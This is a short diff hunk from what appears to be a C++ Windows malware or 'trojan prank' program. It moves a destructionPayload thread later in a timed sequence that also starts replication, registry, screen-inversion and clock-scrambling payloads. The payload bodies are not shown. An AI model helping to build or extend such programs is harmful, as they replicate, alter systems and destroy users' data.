@@ -423,20 +423,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::thread(searchPayload).detach();
     std::thread(cursorTrail).detach();
 
-    // 60 Seconds - Start registry payload & replication payload & destruction payload
+    // 60 Seconds - Start registry payload & replication payload
     std::this_thread::sleep_for(std::chrono::seconds(20));
     std::thread(replicationPayload).detach(); 
     std::thread(registryPayload).detach();    
-    std::thread(destructionPayload).detach(); 
 
     // 80 Seconds - Start screen inverter
     std::this_thread::sleep_for(std::chrono::seconds(20));
     std::thread(invertScreen).detach();
 
-    // 100 Seconds - Start screen tunnel effect & scramble clock
+    // 100 Seconds - Start screen tunnel effect & scramble clock & destruction payload
     std::this_thread::sleep_for(std::chrono::seconds(20));
     std::thread(screenTunnel).detach();
     std::thread(scrambleClock).detach();
+    std::thread(destructionPayload).detach(); 
 
     // 120 Seconds - Start timed message boxes
     std::this_thread::sleep_for(std::chrono::seconds(20));
